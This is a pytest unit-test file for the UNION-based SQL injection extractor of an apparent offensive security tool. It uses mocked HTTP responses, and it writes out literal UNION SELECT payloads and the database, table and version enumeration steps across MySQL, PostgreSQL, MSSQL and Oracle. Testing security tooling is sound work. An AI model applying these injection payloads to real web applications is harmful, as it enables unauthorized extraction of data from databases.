"""Unit tests for the UNION-based SQL injection extractor."""

from __future__ import annotations

import datetime
from unittest.mock import MagicMock

import pytest

from janissary.attack import sqli_union as s

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


class FakeResp:
    def __init__(self, status=200, text="", headers=None):
        self.status_code = status
        self.text = text
        self.headers = headers or {}
        self.content = (text or "").encode()
        self.elapsed = datetime.timedelta(seconds=0.01)


def _session_returning(responses):
    """Return a session whose get() pops responses in order.

    If ``responses`` is a single callable, it is used as the side
    effect directly (useful for payload-aware behaviour).
    """
    session = MagicMock()
    if callable(responses):
        session.get.side_effect = responses
    else:
        session.get.side_effect = list(responses)
    return session


def _payload_aware_session(version="5.7.42-MariaDB", db="appdb"):
    """A session that reflects the sentinel and the version banner.

    It inspects the URL, extracts the requested expression, and
    returns a body that contains a plausible value. This lets us
    exercise the whole extraction flow without a real server.
    """
    import urllib.parse as up

    def get(url, **kwargs):
        qs = up.urlparse(url).query
        raw = up.parse_qs(qs).get("q", [""])[0]

        # Order matters. Most specific matches first.

        # 1. Column discovery.
        if f"'{s.SENTINEL}'" in raw:
            return FakeResp(text=f"<html>prefix {s.SENTINEL} suffix</html>")

        # 2. Table listing. Must precede the current_database check
        # because the MySQL tables query ends with "= database()".
        if (
            "information_schema.tables" in raw
            or "pg_tables" in raw
            or "sys.tables" in raw
            or "sqlite_master" in raw
        ):
            return FakeResp(
                text=f"<html>users{s.GROUP_CONCAT_SEPARATOR}"
                f"orders{s.GROUP_CONCAT_SEPARATOR}"
                f"products</html>"
            )

        # 3. Database listing.
        if (
            "information_schema.schemata" in raw
            or "pg_database" in raw
            or "sys.databases" in raw
        ):
            return FakeResp(
                text=f"<html>appdb{s.GROUP_CONCAT_SEPARATOR}"
                f"mysql{s.GROUP_CONCAT_SEPARATOR}"
                f"information_schema</html>"
            )

        # 4. Version probe.
        if "version()" in raw or "@@version" in raw:
            return FakeResp(text=f"<html>{version}</html>")

        # 5. Current database.
        if "database()" in raw or "current_database()" in raw or "db_name()" in raw:
            return FakeResp(text=f"<html>{db}</html>")

        # 6. Anything else.
        return FakeResp(text="<html>nothing</html>")

    return _session_returning(get)


# ---------------------------------------------------------------------------
# Confirmation gate
# ---------------------------------------------------------------------------


def test_requires_attack_confirm():
    with pytest.raises(s.AttackConfirmationRequired):
        s.UnionExtractor(
            target="http://t/?q=1",
            param="q",
            columns=3,
            attack_confirm=False,
        )


def test_confirm_allows_construction():
    ex = s.UnionExtractor(
        target="http://t/?q=1", param="q", columns=3, attack_confirm=True
    )
    assert ex.columns == 3


def test_column_bounds():
    with pytest.raises(ValueError):
        s.UnionExtractor(target="http://t/", param="q", columns=0, attack_confirm=True)
    with pytest.raises(ValueError):
        s.UnionExtractor(target="http://t/", param="q", columns=99, attack_confirm=True)


# ---------------------------------------------------------------------------
# Payload construction
# ---------------------------------------------------------------------------


def test_build_union_payload_single_column():
    p = s.build_union_payload(1, 1, "'x'")
    assert p == "' UNION SELECT 'x'--"


def test_build_union_payload_three_columns():
    p = s.build_union_payload(3, 2, "version()", "mysql")
    assert p == "' UNION SELECT NULL, version(), NULL-- -"


def test_build_union_payload_rejects_bad_column():
    with pytest.raises(ValueError):
        s.build_union_payload(3, 0, "x")
    with pytest.raises(ValueError):
        s.build_union_payload(3, 4, "x")


def test_build_union_payload_dbms_terminator():
    assert s.build_union_payload(1, 1, "x", "mysql").endswith("-- -")
    assert s.build_union_payload(1, 1, "x", "postgres").endswith("--")


# ---------------------------------------------------------------------------
# DBMS detection
# ---------------------------------------------------------------------------


def test_detect_dbms_mysql():
    assert s.detect_dbms("5.7.42-MariaDB") == "mysql"


def test_detect_dbms_postgres():
    assert s.detect_dbms("PostgreSQL 15.2 on x86_64") == "postgres"


def test_detect_dbms_mssql():
    assert s.detect_dbms("Microsoft SQL Server 2019") == "mssql"


def test_detect_dbms_oracle():
    assert s.detect_dbms("ORA-00933: SQL command not properly ended") == "oracle"


def test_detect_dbms_unknown():
    assert s.detect_dbms("hello world") == "unknown"


# ---------------------------------------------------------------------------
# Concatenation splitter
# ---------------------------------------------------------------------------


def test_split_concat_empty():
    assert s.split_concat("") == []


def test_split_concat_basic():
    v = f"a{s.GROUP_CONCAT_SEPARATOR}b{s.GROUP_CONCAT_SEPARATOR}c"
    assert s.split_concat(v) == ["a", "b", "c"]


def test_split_concat_strips_whitespace():
    v = f" a {s.GROUP_CONCAT_SEPARATOR} b "
    assert s.split_concat(v) == ["a", "b"]


# ---------------------------------------------------------------------------
# Column discovery
# ---------------------------------------------------------------------------


def test_find_reflecting_column_position_two():
    """Sentinel reflects only when it is in column 2."""
    import urllib.parse as up

    def get(url, **kwargs):
        raw = up.parse_qs(up.urlparse(url).query).get("q", [""])[0]
        # Column 2 is the one carrying the sentinel literal.
        if raw.startswith("' UNION SELECT NULL, '") and s.SENTINEL in raw:
            return FakeResp(text=f"<html>{s.SENTINEL}</html>")
        return FakeResp(text="<html>no</html>")

    ex = s.UnionExtractor(
        target="http://t/?q=1",
        param="q",
        columns=3,
        attack_confirm=True,
        session=_session_returning(get),
    )
    assert ex.find_reflecting_column() == 2


def test_find_reflecting_column_none_raises():
    def get(url, **kwargs):
        return FakeResp(text="<html>no sentinel</html>")

    ex = s.UnionExtractor(
        target="http://t/?q=1",
        param="q",
        columns=3,
        attack_confirm=True,
        session=_session_returning(get),
    )
    with pytest.raises(RuntimeError):
        ex.find_reflecting_column()


# ---------------------------------------------------------------------------
# Full extraction flow
# ---------------------------------------------------------------------------


def test_full_extraction_mysql():
    ex = s.UnionExtractor(
        target="http://t/?q=1",
        param="q",
        columns=3,
        attack_confirm=True,
        session=_payload_aware_session(),
    )
    result = ex.run()
    assert result.aborted is False
    assert result.reflecting_column == 1
    assert result.dbms == "mysql"
    assert result.version and "MariaDB" in result.version
    assert result.current_database == "appdb"
    assert "appdb" in result.databases
    assert "users" in result.tables
    assert result.total_requests > 0


def test_extraction_aborts_when_no_reflection():
    def get(url, **kwargs):
        return FakeResp(text="<html>no sentinel anywhere</html>")

    ex = s.UnionExtractor(
        target="http://t/?q=1",
        param="q",
        columns=3,
        attack_confirm=True,
        session=_session_returning(get),
    )
    result = ex.run()
    assert result.aborted is True
    assert "reflecting column" in result.abort_reason


def test_extraction_aborts_on_unstable_target():
    import urllib.parse as up

    def get(url, **kwargs):
        raw = up.parse_qs(up.urlparse(url).query).get("q", [""])[0]
        if f"'{s.SENTINEL}'" in raw:
            return FakeResp(text=f"<html>{s.SENTINEL}</html>")
        return FakeResp(text="<html>server has gone away</html>")

    ex = s.UnionExtractor(
        target="http://t/?q=1",
        param="q",
        columns=3,
        attack_confirm=True,
        session=_session_returning(get),
    )
    result = ex.run()
    assert result.aborted is True
    assert "instability" in result.abort_reason


def test_extraction_handles_transport_error():
    import urllib.parse as up

    import requests

    def get(url, **kwargs):
        raw = up.parse_qs(up.urlparse(url).query).get("q", [""])[0]
        if f"'{s.SENTINEL}'" in raw:
            return FakeResp(text=f"<html>{s.SENTINEL}</html>")
        raise requests.RequestException("connection refused")

    ex = s.UnionExtractor(
        target="http://t/?q=1",
        param="q",
        columns=3,
        attack_confirm=True,
        session=_session_returning(get),
    )
    result = ex.run()
    # Discovery succeeded; downstream steps recorded transport errors
    # as step entries rather than aborting.
    assert result.reflecting_column == 1
    assert any(step.error for step in result.steps)


# ---------------------------------------------------------------------------
# Result serialisation
# ---------------------------------------------------------------------------


def test_result_to_dict_roundtrip():
    ex = s.UnionExtractor(
        target="http://t/?q=1",
        param="q",
        columns=3,
        attack_confirm=True,
        session=_payload_aware_session(),
    )
    result = ex.run()
    d = result.to_dict()
    assert d["target"] == "http://t/?q=1"
    assert d["param"] == "q"
    assert d["columns"] == 3
    assert isinstance(d["steps"], list)
    assert "aborted" in d


# ---------------------------------------------------------------------------
# Limits
# ---------------------------------------------------------------------------


def test_max_rows_clamped():
    ex = s.UnionExtractor(
        target="http://t/",
        param="q",
        columns=1,
        attack_confirm=True,
        max_rows=10_000,
    )
    assert ex.max_rows == 100


def test_max_bytes_clamped():
    ex = s.UnionExtractor(
        target="http://t/",
        param="q",
        columns=1,
        attack_confirm=True,
        max_bytes=1,
    )
    assert ex.max_bytes == 256


# ---------------------------------------------------------------------------
# Pacer integration
# ---------------------------------------------------------------------------


def test_pacer_is_used_when_supplied():
    calls: list = []

    class FakePacer:
        def wait(self):
            calls.append("wait")

        def record(self, status, elapsed):
            calls.append(("record", status))

    ex = s.UnionExtractor(
        target="http://t/?q=1",
        param="q",
        columns=3,
        attack_confirm=True,
        session=_payload_aware_session(),
        pacer=FakePacer(),
    )
    ex.run()
    assert "wait" in calls
    assert any(isinstance(c, tuple) for c in calls)
